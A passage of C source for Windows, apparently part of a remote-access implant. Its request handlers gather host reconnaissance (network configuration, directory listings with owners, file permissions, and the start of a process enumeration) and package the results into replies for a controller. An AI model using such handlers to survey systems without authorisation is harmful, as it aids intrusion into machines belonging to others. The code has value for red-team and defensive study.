	LPSTR lpDhcpServer = NULL;
	LPSTR lpDnsServerAddr = NULL;
	PIP_ADAPTER_UNICAST_ADDRESS_LH pAdapterUnicastAddr = NULL;
	PIP_ADAPTER_GATEWAY_ADDRESS_LH pGateWayAddr = NULL;
	PIP_ADAPTER_DNS_SERVER_ADDRESS_XP pDnsServerAddr = NULL;
	ULONG uMask = 0;
	LPSTR lpHostName = NULL;
	LPSTR lpPrimaryDnsSuffix = NULL;
	PENVELOPE pRespEnvelope = NULL;
	PFIXED_INFO pFixedInfo = NULL;
	DWORD cbFixedInfo = sizeof(FIXED_INFO);
	DWORD dwLastError = 0;
	LPSTR lpNodeType = NULL;
	LPSTR lpRespData = NULL;
	LPSTR lpTempStr = NULL;
	PPBElement pElement = NULL;

	lpHostName = GetHostName();
	if (lpHostName == NULL) {
		goto CLEANUP;
	}

	lpPrimaryDnsSuffix = GetPrimaryDnsSuffix();
	pFixedInfo = ALLOC(cbFixedInfo);
	while (TRUE) {
		dwLastError = GetNetworkParams(pFixedInfo, &cbFixedInfo);
		if (dwLastError == ERROR_SUCCESS) {
			break;
		}
		else if (dwLastError == ERROR_BUFFER_OVERFLOW) {
			pFixedInfo = REALLOC(pFixedInfo, cbFixedInfo);
		}
		else {
			FREE(pFixedInfo);
			pFixedInfo = NULL;
			break;
		}
	}

	if (pFixedInfo->NodeType == BROADCAST_NODETYPE) {
		lpNodeType = DuplicateStrA("Broadcast", 0);
	}
	else if (pFixedInfo->NodeType == PEER_TO_PEER_NODETYPE) {
		lpNodeType = DuplicateStrA("Peer to peer", 0);
	}
	else if (pFixedInfo->NodeType == MIXED_NODETYPE) {
		lpNodeType = DuplicateStrA("Mixed", 0);
	}
	else if (pFixedInfo->NodeType == HYBRID_NODETYPE) {
		lpNodeType = DuplicateStrA("Hybrid", 0);
	}

	pAdapterInfo = ALLOC(cbAdapterInfo);
	pTemp = pAdapterInfo;
	dwErrorCode = GetAdaptersAddresses(0, GAA_FLAG_INCLUDE_GATEWAYS | GAA_FLAG_INCLUDE_WINS_INFO | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_ANYCAST, NULL, pAdapterInfo, &cbAdapterInfo);
	if (dwErrorCode == ERROR_BUFFER_OVERFLOW) {
		pAdapterInfo = REALLOC(pAdapterInfo, cbAdapterInfo);
		pTemp = pAdapterInfo;
		dwErrorCode = GetAdaptersAddresses(0, GAA_FLAG_INCLUDE_GATEWAYS | GAA_FLAG_INCLUDE_WINS_INFO | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_ANYCAST, NULL, pAdapterInfo, &cbAdapterInfo);
		if (dwErrorCode != ERROR_SUCCESS) {
			LOG_ERROR("GetAdaptersAddresses", GetLastError());
			goto CLEANUP;
		}
	}

	lpRespData = ALLOC(0x2000);
	lpRespData = StrCatExA(lpRespData, "\nWindows IP Configuration\n\n   Host Name . . . . . . . . . . . . : ");
	lpRespData = StrCatExA(lpRespData, lpHostName);
	lpRespData = StrCatExA(lpRespData, "\n   Primary Dns Suffix  . . . . . . . : ");
	if (lpPrimaryDnsSuffix != NULL) {
		lpRespData = StrCatExA(lpRespData, lpPrimaryDnsSuffix);
	}

	lpRespData = StrCatExA(lpRespData, "\n   Node Type . . . . . . . . . . . . : ");
	if (lpNodeType != NULL) {
		lpRespData = StrCatExA(lpRespData, lpNodeType);
	}

	lpRespData = StrCatExA(lpRespData, "\n   IP Routing Enabled. . . . . . . . : ");
	if (pFixedInfo->EnableRouting) {
		lpRespData = StrCatExA(lpRespData, "yes");
	}
	else {
		lpRespData = StrCatExA(lpRespData, "no");
	}

	lpRespData = StrCatExA(lpRespData, "\n   WINS Proxy Enabled. . . . . . . . : ");
	if (pFixedInfo->EnableProxy) {
		lpRespData = StrCatExA(lpRespData, "yes");
	}
	else {
		lpRespData = StrCatExA(lpRespData, "no");
	}

	while (TRUE) {
		if (pAdapterInfo == NULL) {
			break;
		}

		if (pAdapterInfo->IfType == IF_TYPE_SOFTWARE_LOOPBACK) {
			pAdapterInfo = pAdapterInfo->Next;
			continue;
		}

		lpRespData = StrCatExA(lpRespData, "\n\n");
		lpTempStr = ConvertWcharToChar(pAdapterInfo->FriendlyName);
		lpRespData = StrCatExA(lpRespData, lpTempStr);
		FREE(lpTempStr);
		lpRespData = StrCatExA(lpRespData, ":\n\n   Connection-specific DNS Suffix  . : ");
		if (pAdapterInfo->DnsSuffix != NULL && lstrlenW(pAdapterInfo->DnsSuffix) > 0) {
			lpTempStr = ConvertWcharToChar(pAdapterInfo->DnsSuffix);
			lpRespData = StrCatExA(lpRespData, lpTempStr);
			FREE(lpTempStr);
		}

		lpRespData = StrCatExA(lpRespData, "\n   Description . . . . . . . . . . . : ");
		lpTempStr = ConvertWcharToChar(pAdapterInfo->Description);
		lpRespData = StrCatExA(lpRespData, lpTempStr);
		FREE(lpTempStr);
		lpRespData = StrCatExA(lpRespData, "\n   Physical Address. . . . . . . . . : ");
		SecureZeroMemory(szTempBuffer, sizeof(szTempBuffer));
		for (i = 0; i < pAdapterInfo->PhysicalAddressLength; i++) {
			wsprintfA(&szTempBuffer[i * 3], "%02X-", pAdapterInfo->PhysicalAddress[i]);
		}

		szTempBuffer[lstrlenA(szTempBuffer) - 1] = '\0';
		lpRespData = StrCatExA(lpRespData, szTempBuffer);
		lpRespData = StrCatExA(lpRespData, "\n   DHCP Enabled. . . . . . . . . . . : ");
		if (pAdapterInfo->Flags & IP_ADAPTER_DHCP_ENABLED) {
			lpRespData = StrCatExA(lpRespData, "yes");
		}
		else {
			lpRespData = StrCatExA(lpRespData, "no");
		}

		lpRespData = StrCatExA(lpRespData, "\n   Autoconfiguration Enabled . . . . : yes");
		if (pAdapterInfo->OperStatus == IfOperStatusDown) {
			pAdapterInfo = pAdapterInfo->Next;
			continue;
		}

		lpRespData = StrCatExA(lpRespData, "\n   IP Address. . . . . . . . . . . . : ");
		pAdapterUnicastAddr = pAdapterInfo->FirstUnicastAddress;
		while (TRUE) {
			if (pAdapterUnicastAddr == NULL || pAdapterUnicastAddr->Address.lpSockaddr == NULL) {
				break;
			}

			if (pAdapterUnicastAddr->DadState < NldsDeprecated) {
				pAdapterUnicastAddr = pAdapterUnicastAddr->Next;
				continue;
			}

			if (pAdapterUnicastAddr != pAdapterInfo->FirstUnicastAddress) {
				lpRespData = StrCatExA(lpRespData, "\n                                       ");
			}

			lpUnicastAddr = SocketAddressToStr(pAdapterUnicastAddr->Address.lpSockaddr);
			lpRespData = StrCatExA(lpRespData, lpUnicastAddr);
			FREE(lpUnicastAddr);

			if (pAdapterUnicastAddr->Address.lpSockaddr->sa_family == AF_INET) {
				if (ConvertLengthToIpv4Mask(pAdapterUnicastAddr->OnLinkPrefixLength, &uMask) == STATUS_SUCCESS) {
					SecureZeroMemory(szTempBuffer, sizeof(szTempBuffer));
					wsprintfA(szTempBuffer, "/%d", uMask);
				}
			}

			pAdapterUnicastAddr = pAdapterUnicastAddr->Next;
		}

		lpRespData = StrCatExA(lpRespData, "\n   Default Gateway . . . . . . . . . : ");
		pGateWayAddr = pAdapterInfo->FirstGatewayAddress;
		while (TRUE) {
			if (pGateWayAddr == NULL || pGateWayAddr->Address.lpSockaddr == NULL) {
				break;
			}

			if (pGateWayAddr != pAdapterInfo->FirstGatewayAddress) {
				lpRespData = StrCatExA(lpRespData, "\n                                       ");
			}

			lpGateWayAddr = SocketAddressToStr(pGateWayAddr->Address.lpSockaddr);
			lpRespData = StrCatExA(lpRespData, lpGateWayAddr);
			FREE(lpGateWayAddr);
			pGateWayAddr = pGateWayAddr->Next;
		}

		lpRespData = StrCatExA(lpRespData, "\n   DHCP Server . . . . . . . . . . . : ");
		if (pAdapterInfo->Dhcpv4Server.lpSockaddr != NULL) {
			lpDhcpServer = SocketAddressToStr(pAdapterInfo->Dhcpv4Server.lpSockaddr);
			lpRespData = StrCatExA(lpRespData, lpDhcpServer);
		}
		else if (pAdapterInfo->Dhcpv6Server.lpSockaddr != NULL) {
			lpDhcpServer = SocketAddressToStr(pAdapterInfo->Dhcpv6Server.lpSockaddr);
			lpRespData = StrCatExA(lpRespData, lpDhcpServer);
		}

		lpRespData = StrCatExA(lpRespData, "\n   DNS Servers . . . . . . . . . . . : ");
		pDnsServerAddr = pAdapterInfo->FirstDnsServerAddress;
		while (TRUE) {
			if (pDnsServerAddr == NULL || pDnsServerAddr->Address.lpSockaddr == NULL) {
				break;
			}

			if (pDnsServerAddr != pAdapterInfo->FirstDnsServerAddress) {
				lpRespData = StrCatExA(lpRespData, "\n                                       ");
			}

			lpDnsServerAddr = SocketAddressToStr(pDnsServerAddr->Address.lpSockaddr);
			lpRespData = StrCatExA(lpRespData, lpDnsServerAddr);
			FREE(lpDnsServerAddr);
			pDnsServerAddr = pDnsServerAddr->Next;
		}

		lpRespData = StrCatExA(lpRespData, "\n   NetBIOS over Tcpip. . . . . . . . : ");
		if (pAdapterInfo->Flags & IP_ADAPTER_NETBIOS_OVER_TCPIP_ENABLED) {
			lpRespData = StrCatExA(lpRespData, "yes");
		}
		else {
			lpRespData = StrCatExA(lpRespData, "no");
		}

		pAdapterInfo = pAdapterInfo->Next;
	}

	pElement = CreateBytesElement(lpRespData, lstrlenA(lpRespData), 1);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pElement->cbMarshalledData;
	pElement->pMarshalledData = NULL;
	pElement->cbMarshalledData = 0;
CLEANUP:
	FreeElement(pElement);
	if (pTemp != NULL) {
		FREE(pTemp);
	}

	if (lpHostName != NULL) {
		FREE(lpHostName);
	}

	if (lpPrimaryDnsSuffix != NULL) {
		FREE(lpPrimaryDnsSuffix);
	}

	if (pFixedInfo != NULL) {
		FREE(pFixedInfo);
	}

	if (lpNodeType != NULL) {
		FREE(lpNodeType);
	}

	if (lpDhcpServer != NULL) {
		FREE(lpDhcpServer);
	}

	if (lpRespData != NULL) {
		FREE(lpRespData);
	}

	return pRespEnvelope;
}

BOOL LsHandlerCallback
(
	_In_ LPWSTR lpPath,
	_In_ LPVOID lpArgs
)
{
	PFILE_INFO* pFirstFileInfo = (PFILE_INFO*)lpArgs;
	PFILE_INFO pCurrentFileInfo = NULL;
	PFILETIME pModifiedTime = NULL;
	LPSTR lpTemp = NULL;

	if (pFirstFileInfo[0]->dwIdx >= pFirstFileInfo[0]->dwMaxCount) {
		return TRUE;
	}

	pCurrentFileInfo = pFirstFileInfo[pFirstFileInfo[0]->dwIdx++];
	if (IsFolderExist(lpPath)) {
		pCurrentFileInfo->IsDir = TRUE;
	}
	else {
		pCurrentFileInfo->uFileSize = GetFileSizeByPath(lpPath);
	}

	lpTemp = ConvertWcharToChar(lpPath);
	pCurrentFileInfo->lpName = GetNameFromPathA(lpTemp);
	FREE(lpTemp);
	pCurrentFileInfo->lpOwner = GetFileOwner(lpPath);
	pModifiedTime = GetModifiedTime(lpPath);
	if (pModifiedTime != NULL) {
		pCurrentFileInfo->uModifiedTime = (UINT)((*((LONGLONG*)pModifiedTime) - 116444736000000000) / 10000000);
		FREE(pModifiedTime);
	}
	
	if (!pCurrentFileInfo->IsDir && IsStrEndsWithW(lpPath, L".lnk")) {
		lpTemp = GetTargetShortcutFile(lpPath);
		pCurrentFileInfo->lpLinkPath = ConvertWcharToChar(lpTemp);
		FREE(lpTemp);
	}
	else {
		lpTemp = GetSymbolLinkTargetPath(lpPath);
		pCurrentFileInfo->lpLinkPath = ConvertWcharToChar(lpTemp);
		FREE(lpTemp);
	}

	return FALSE;
}

VOID FreeFileInfo
(
	_In_ PFILE_INFO pFileInfo
)
{
	if (pFileInfo != NULL) {
		if (pFileInfo->lpName != NULL) {
			FREE(pFileInfo->lpName);
		}

		if (pFileInfo->lpOwner != NULL) {
			FREE(pFileInfo->lpOwner);
		}

		if (pFileInfo->lpLinkPath != NULL) {
			FREE(pFileInfo->lpLinkPath);
		}

		FREE(pFileInfo);
	}
}

PENVELOPE LsHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement pRecvElement = NULL;
	PPBElement FileInfoElement[8];
	PPBElement LsElement[5];
	PPBElement pFinalElement = NULL;
	PPBElement* pElementList = NULL;
	PBUFFER* UnmarshalledData = NULL;
	LPSTR lpPath = NULL;
	LPSTR lpFullPath = NULL;
	LPWSTR lpConvertedPath = NULL;
	PENVELOPE pRespEnvelope = NULL;
	DWORD dwNumberOfItems = 0;
	PFILE_INFO* FileList = NULL;
	DWORD i = 0;
	DWORD j = 0;
	DWORD dwReturnedLength = 0;
	CHAR szTimeZone[0x10];
	TIME_ZONE_INFORMATION TimeZoneInfo;

	pRecvElement = ALLOC(sizeof(PBElement));
	pRecvElement->Type = Bytes;
	pRecvElement->dwFieldIdx = 1;

	UnmarshalledData = UnmarshalStruct(&pRecvElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshalledData[0] == NULL) {
		goto CLEANUP;
	}

	lpPath = DuplicateStrA(UnmarshalledData[0]->pBuffer, 0);
	lpFullPath = ALLOC(MAX_PATH + 1);
	dwReturnedLength = GetFullPathNameA(lpPath, MAX_PATH + 1, lpFullPath, NULL);
	if (dwReturnedLength == 0) {
		LOG_ERROR("GetFullPathNameA", GetLastError());
		goto CLEANUP;
	}
	else if (dwReturnedLength > MAX_PATH) {
		lpFullPath = REALLOC(lpFullPath, dwReturnedLength + 1);
		GetFullPathNameA(lpPath, dwReturnedLength + 1, lpFullPath, NULL);
	}

	lpConvertedPath = ConvertCharToWchar(lpFullPath);
	if (!IsPathExist(lpConvertedPath)) {
		LogError(L"%s is not exist\n", lpConvertedPath);
		goto CLEANUP;
	}

	SecureZeroMemory(&TimeZoneInfo, sizeof(TimeZoneInfo));
	GetTimeZoneInformation(&TimeZoneInfo);
	wsprintfA(szTimeZone, "%03d", TimeZoneInfo.Bias / (-60));
	if (TimeZoneInfo.Bias <= 0) {
		szTimeZone[0] = '+';
	}
	else {
		szTimeZone[0] = '-';
	}

	SecureZeroMemory(LsElement, sizeof(LsElement));
	LsElement[0] = CreateBytesElement(lpFullPath, lstrlenA(lpFullPath), 1);
	LsElement[1] = CreateVarIntElement(TRUE, 2);
	if (IsFileExist(lpConvertedPath)) {
		FileList = ALLOC(sizeof(PFILE_INFO));
		FileList[0] = ALLOC(sizeof(FILE_INFO));
		dwNumberOfItems = 1;
		FileList[0]->dwMaxCount = dwNumberOfItems;
		LsHandlerCallback(lpConvertedPath, FileList);

		SecureZeroMemory(&FileInfoElement, sizeof(FileInfoElement));
		FileInfoElement[0] = CreateBytesElement(FileList[0]->lpName, lstrlenA(FileList[i]->lpName), 1);
		FileInfoElement[1] = CreateVarIntElement(FileList[0]->IsDir, 2);
		FileInfoElement[2] = CreateVarIntElement(FileList[0]->uFileSize, 3);
		FileInfoElement[3] = CreateVarIntElement(FileList[0]->uModifiedTime, 4);
		FileInfoElement[5] = CreateBytesElement(FileList[0]->lpLinkPath, lstrlenA(FileList[i]->lpLinkPath), 6);
		FileInfoElement[6] = CreateBytesElement(FileList[0]->lpOwner, lstrlenA(FileList[i]->lpOwner), 7);

		pElementList = ALLOC(sizeof(PPBElement) * dwNumberOfItems);
		pElementList[0] = CreateStructElement(FileInfoElement, _countof(FileInfoElement), 0);
	}
	else {
		dwNumberOfItems = GetChildItemCount(lpConvertedPath);
		FileList = ALLOC(sizeof(PFILE_INFO) * dwNumberOfItems);
		for (i = 0; i < dwNumberOfItems; i++) {
			FileList[i] = ALLOC(sizeof(FILE_INFO));
		}

		FileList[0]->dwMaxCount = dwNumberOfItems;
		ListFileEx(lpConvertedPath, 0, (LIST_FILE_CALLBACK)LsHandlerCallback, FileList);
		dwNumberOfItems = FileList[0]->dwIdx;
		pElementList = ALLOC(sizeof(PPBElement) * dwNumberOfItems);
		for (i = 0; i < dwNumberOfItems; i++) {
			SecureZeroMemory(&FileInfoElement, sizeof(FileInfoElement));
			FileInfoElement[0] = CreateBytesElement(FileList[i]->lpName, lstrlenA(FileList[i]->lpName), 1);
			FileInfoElement[1] = CreateVarIntElement(FileList[i]->IsDir, 2);
			FileInfoElement[2] = CreateVarIntElement(FileList[i]->uFileSize, 3);
			FileInfoElement[3] = CreateVarIntElement(FileList[i]->uModifiedTime, 4);
			FileInfoElement[5] = CreateBytesElement(FileList[i]->lpLinkPath, lstrlenA(FileList[i]->lpLinkPath), 6);
			FileInfoElement[6] = CreateBytesElement(FileList[i]->lpOwner, lstrlenA(FileList[i]->lpOwner), 7);

			pElementList[i] = CreateStructElement(FileInfoElement, _countof(FileInfoElement), 0);
		}
	}

	LsElement[2] = CreateRepeatedStructElement(pElementList, dwNumberOfItems, 3);
	LsElement[3] = CreateBytesElement(szTimeZone, lstrlenA(szTimeZone), 4);
	LsElement[4] = CreateVarIntElement(TimeZoneInfo.Bias < 0 ? -(TimeZoneInfo.Bias * 60) : TimeZoneInfo.Bias * 60, 5);
	pFinalElement = CreateStructElement(LsElement, _countof(LsElement), 0);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
	pFinalElement->pMarshalledData = NULL;
	pFinalElement->cbMarshalledData = 0;
CLEANUP:
	if (UnmarshalledData != NULL) {
		FreeBuffer(UnmarshalledData[0]);
		FREE(UnmarshalledData);
	}

	if (lpPath != NULL) {
		FREE(lpPath);
	}

	if (pElementList != NULL) {
		FREE(pElementList);
	}

	if (lpConvertedPath != NULL) {
		FREE(lpConvertedPath);
	}

	if (FileList != NULL) {
		for (i = 0; i < dwNumberOfItems; i++) {
			FreeFileInfo(FileList[i]);
		}

		FREE(FileList);
	}

	if (lpFullPath != NULL) {
		FREE(lpFullPath);
	}

	FreeElement(pRecvElement);
	FreeElement(pFinalElement);

	return pRespEnvelope;
}

PENVELOPE IcaclsHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement pRecvElement = NULL;
	PBUFFER* UnmarshalledData = NULL;
	LPSTR lpPath = NULL;
	LPWSTR lpTempPath = NULL;
	PENVELOPE pRespEnvelope = NULL;
	PACL pAcl = NULL;
	PACE_HEADER pAceHdr = NULL;
	DWORD i = 0;
	PSID pSid = NULL;
	LPSTR lpSidName = NULL;
	LPSTR lpRespData = NULL;
	DWORD dwMask = 0;
	PPBElement pFinalElement = NULL;

	pRecvElement = ALLOC(sizeof(PBElement));
	pRecvElement->Type = Bytes;
	pRecvElement->dwFieldIdx = 1;

	UnmarshalledData = UnmarshalStruct(&pRecvElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshalledData[0] == NULL) {
		goto CLEANUP;
	}

	lpPath = DuplicateStrA(UnmarshalledData[0]->pBuffer, 0);
	lpTempPath = ConvertCharToWchar(lpPath);
	if (!IsPathExist(lpTempPath)) {
		LogError(L"%s is not exist\n", lpTempPath);
		goto CLEANUP;
	}

	pAcl = GetFileDacl(lpTempPath);
	pAceHdr = (PACE_HEADER)(&pAcl[1]);
	for (i = 0; i < pAcl->AceCount; i++) {
		pSid = (PSID)((ULONG_PTR)pAceHdr + 8);
		if (IsValidSid(pSid)) {
			lpSidName = LookupNameOfSid(pSid, TRUE);
			if (lpSidName != NULL) {
				lpRespData = StrCatExA(lpRespData, lpSidName);
				lpRespData = StrCatExA(lpRespData, ":");
			}
		}

		if (pAceHdr->AceFlags & INHERITED_ACE) {
			lpRespData = StrCatExA(lpRespData, "(I)");
		}

		if (pAceHdr->AceFlags & OBJECT_INHERIT_ACE) {
			lpRespData = StrCatExA(lpRespData, "(OI)");
		}

		if (pAceHdr->AceFlags & CONTAINER_INHERIT_ACE) {
			lpRespData = StrCatExA(lpRespData, "(CI)");
		}

		if (pAceHdr->AceFlags & NO_PROPAGATE_INHERIT_ACE) {
			lpRespData = StrCatExA(lpRespData, "(NP)");
		}

		if (pAceHdr->AceFlags & INHERIT_ONLY_ACE) {
			lpRespData = StrCatExA(lpRespData, "(IO)");
		}

		if (pAceHdr->AceFlags & CRITICAL_ACE_FLAG) {
			lpRespData = StrCatExA(lpRespData, "(CR)");
		}

		dwMask = *(PDWORD)((ULONG_PTR)pAceHdr + sizeof(ACE_HEADER));
		if (pAceHdr->AceType == ACCESS_DENIED_ACE_TYPE) {
			dwMask |= SYNCHRONIZE;
		}

		lpRespData = StrCatExA(lpRespData, "(");
		if (pAceHdr->AceType < SYSTEM_AUDIT_ACE_TYPE || (pAceHdr->AceType > SYSTEM_SCOPED_POLICY_ID_ACE_TYPE && pAceHdr->AceType <= SYSTEM_ACCESS_FILTER_ACE_TYPE)) {
			if (dwMask == 0x1F01FF || dwMask == GENERIC_ALL) {
				if (pAceHdr->AceType == ACCESS_ALLOWED_ACE_TYPE) {
					lpRespData = StrCatExA(lpRespData, "F,");
				}
				else {
					lpRespData = StrCatExA(lpRespData, "N,");
				}

				dwMask = 0;
			}

			if ((dwMask & 0x1301BF) == 0x1301BF) {
				lpRespData = StrCatExA(lpRespData, "M,");
				dwMask &= ~0x1301BF;
			}

			if ((dwMask & 0x1200A9) == 0x1200A9) {
				lpRespData = StrCatExA(lpRespData, "RX,");
				dwMask &= ~0x1200A9;
			}
			else if ((dwMask & 0x120089) == 0x120089) {
				lpRespData = StrCatExA(lpRespData, "R,");
				dwMask &= ~0x120089;
			}

			if ((dwMask & 0x100116) == 0x100116) {
				lpRespData = StrCatExA(lpRespData, "W,");
				dwMask &= ~0x100116;
			}

			if ((dwMask & 0xE0010000) == 0xE0010000) {
				lpRespData = StrCatExA(lpRespData, "M,");
				dwMask &= ~0xE0010000;
			}

			if ((dwMask & 0x110000) == 0x110000) {
				lpRespData = StrCatExA(lpRespData, "D,");
				dwMask &= ~0x110000;
			}
		}
		else if (pAceHdr->AceType == SYSTEM_MANDATORY_LABEL_ACE_TYPE) {
			if (dwMask & 1) {
				lpRespData = StrCatExA(lpRespData, "NW,");
				dwMask &= ~1;
			}

			if (dwMask & 2) {
				lpRespData = StrCatExA(lpRespData, "NR,");
				dwMask &= ~2;
			}

			if (dwMask & 4) {
				lpRespData = StrCatExA(lpRespData, "NX,");
				dwMask &= ~4;
			}
		}

		if ((dwMask & DELETE) == DELETE) {
			lpRespData = StrCatExA(lpRespData, "DE,");
			dwMask &= ~DELETE;
		}

		if ((dwMask & READ_CONTROL) == READ_CONTROL) {
			lpRespData = StrCatExA(lpRespData, "Rc,");
			dwMask &= ~READ_CONTROL;
		}

		if ((dwMask & WRITE_DAC) == WRITE_DAC) {
			lpRespData = StrCatExA(lpRespData, "WDAC,");
			dwMask &= ~WRITE_DAC;
		}

		if ((dwMask & WRITE_OWNER) == WRITE_OWNER) {
			lpRespData = StrCatExA(lpRespData, "WO,");
			dwMask &= ~WRITE_OWNER;
		}

		if ((dwMask & SYNCHRONIZE) == SYNCHRONIZE) {
			lpRespData = StrCatExA(lpRespData, "S,");
			dwMask &= ~SYNCHRONIZE;
		}

		if ((dwMask & ACCESS_SYSTEM_SECURITY) == ACCESS_SYSTEM_SECURITY) {
			lpRespData = StrCatExA(lpRespData, "AS,");
			dwMask &= ~ACCESS_SYSTEM_SECURITY;
		}

		if ((dwMask & MAXIMUM_ALLOWED) == MAXIMUM_ALLOWED) {
			lpRespData = StrCatExA(lpRespData, "MA,");
			dwMask &= ~MAXIMUM_ALLOWED;
		}

		if ((dwMask & GENERIC_READ) == GENERIC_READ) {
			lpRespData = StrCatExA(lpRespData, "GR,");
			dwMask &= ~GENERIC_READ;
		}

		if ((dwMask & GENERIC_WRITE) == GENERIC_WRITE) {
			lpRespData = StrCatExA(lpRespData, "GW,");
			dwMask &= ~GENERIC_WRITE;
		}

		if ((dwMask & GENERIC_EXECUTE) == GENERIC_EXECUTE) {
			lpRespData = StrCatExA(lpRespData, "GE,");
			dwMask &= ~GENERIC_EXECUTE;
		}

		if ((dwMask & GENERIC_ALL) == GENERIC_ALL) {
			lpRespData = StrCatExA(lpRespData, "GA,");
			dwMask &= ~GENERIC_ALL;
		}

		if ((dwMask & FILE_READ_DATA) == FILE_READ_DATA) {
			lpRespData = StrCatExA(lpRespData, "RD,");
			dwMask &= ~FILE_READ_DATA;
		}

		if ((dwMask & FILE_WRITE_DATA) == FILE_WRITE_DATA) {
			lpRespData = StrCatExA(lpRespData, "WD,");
			dwMask &= ~FILE_WRITE_DATA;
		}

		if ((dwMask & FILE_APPEND_DATA) == FILE_APPEND_DATA) {
			lpRespData = StrCatExA(lpRespData, "AD,");
			dwMask &= ~FILE_APPEND_DATA;
		}

		if ((dwMask & FILE_READ_EA) == FILE_READ_EA) {
			lpRespData = StrCatExA(lpRespData, "REA,");
			dwMask &= ~FILE_READ_EA;
		}

		if ((dwMask & FILE_WRITE_EA) == FILE_WRITE_EA) {
			lpRespData = StrCatExA(lpRespData, "WEA,");
			dwMask &= ~FILE_WRITE_EA;
		}

		if ((dwMask & FILE_EXECUTE) == FILE_EXECUTE) {
			lpRespData = StrCatExA(lpRespData, "X,");
			dwMask &= ~FILE_EXECUTE;
		}

		if ((dwMask & FILE_DELETE_CHILD) == FILE_DELETE_CHILD) {
			lpRespData = StrCatExA(lpRespData, "DC,");
			dwMask &= ~FILE_DELETE_CHILD;
		}

		if ((dwMask & FILE_READ_ATTRIBUTES) == FILE_READ_ATTRIBUTES) {
			lpRespData = StrCatExA(lpRespData, "RA,");
			dwMask &= ~FILE_READ_ATTRIBUTES;
		}

		if ((dwMask & FILE_WRITE_ATTRIBUTES) == FILE_WRITE_ATTRIBUTES) {
			lpRespData = StrCatExA(lpRespData, "WA,");
			dwMask &= ~FILE_WRITE_ATTRIBUTES;
		}

		lpRespData[lstrlenA(lpRespData) - 1] = ')';
		lpRespData = StrCatExA(lpRespData, "\n");
		pAceHdr = (PACE_HEADER)((ULONG_PTR)pAceHdr + pAceHdr->AceSize);
	}

	pFinalElement = CreateBytesElement(lpRespData, lstrlenA(lpRespData), 1);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pFinalElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pFinalElement->cbMarshalledData;
	pFinalElement->pMarshalledData = NULL;
	pFinalElement->cbMarshalledData = 0;
CLEANUP:
	if (UnmarshalledData != NULL) {
		FreeBuffer(UnmarshalledData[0]);
		FREE(UnmarshalledData);
	}

	if (lpPath != NULL) {
		FREE(lpPath);
	}

	if (pAcl != NULL) {
		FREE(pAcl);
	}

	if (lpTempPath != NULL) {
		FREE(lpTempPath);
	}

	if (lpRespData != NULL) {
		FREE(lpRespData);
	}

	FreeElement(pRecvElement);
	FreeElement(pFinalElement);

	return pRespEnvelope;
}

#define PH_NEXT_PROCESS(Process) ( \
    ((PSYSTEM_PROCESS_INFORMATION)(Process))->NextEntryOffset ? \
    (PSYSTEM_PROCESS_INFORMATION)PTR_ADD_OFFSET((Process), \
    ((PSYSTEM_PROCESS_INFORMATION)(Process))->NextEntryOffset) : \
    NULL \
    )

PENVELOPE PsHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PBYTE pProcesses = NULL;
	PSYSTEM_PROCESS_INFORMATION pProcessInfo = NULL;
	PPROCESS_BASIC_INFORMATION pBasicInfo = NULL;
	PPBElement PrivilegeElements[2];
	PPBElement pTokenGroupElements[5];
	PPBElement pTokenElements[8];
	PPBElement pProcessElements[12];
	PPBElement* pElementList = NULL;
	PPBElement* pElementList2 = NULL;
	PPBElement pFinalElement = NULL;
	DWORD cElementList2 = 0x400;
	PIMAGE_VERION pImageVersion = NULL;
	LPSTR lpImagePath = NULL;
	DWORD dwGroupsCount = 0;
	DWORD cbProcesses = 0;
	HANDLE hToken = NULL;
	DWORD i = 0;
	DWORD j = 0;
	DWORD dwIdx = 0;
	LPSTR lpTempStr = NULL;
	HANDLE hProc = NULL;
	DWORD dwArch = 0;
	LPSTR ElevationDescs[] = { NULL, "No (Default)", "No (Full)", "No (Limited)", "Yes", "Yes (Default)", "Yes (Full)", "Yes (Limited))" };
	PTOKEN_INFO pTokenInfo = NULL;
	PTOKEN_GROUP_INFO pGroupInfo = NULL;
	DWORD dwPrivilegeAttr = 0;
	PENVELOPE pRespEnvelope = NULL;
	DWORD dwTemp = 0;
	PPBElement pReceivedElement = NULL;
	PUINT64 pUnmarshalledPid = NULL;

	pReceivedElement = ALLOC(sizeof(PBElement));
	pReceivedElement->Type = Varint;
	pReceivedElement->dwFieldIdx = 1;
	pUnmarshalledPid = UnmarshalStruct(&pReceivedElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	pProcesses = EnumProcess(&cbProcesses);
	if (pProcesses == NULL || cbProcesses == 0) {
		goto CLEANUP;
	}

	pElementList2 = ALLOC(sizeof(PPBElement) * cElementList2);
	pProcessInfo = pProcesses;
	do {
		if (pProcessInfo->UniqueProcessId == SYSTEM_IDLE_PROCESS_ID || pProcessInfo->UniqueProcessId == SYSTEM_PROCESS_ID) {
			continue;
		}

		if (pUnmarshalledPid != NULL && pProcessInfo->UniqueProcessId != *pUnmarshalledPid) {
			continue;
		}

		hProc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, (DWORD)pProcessInfo->UniqueProcessId);
		if (hProc == NULL) {
			continue;
		}

		if (dwIdx >= cElementList2) {
			cElementList2 = dwIdx * 2;
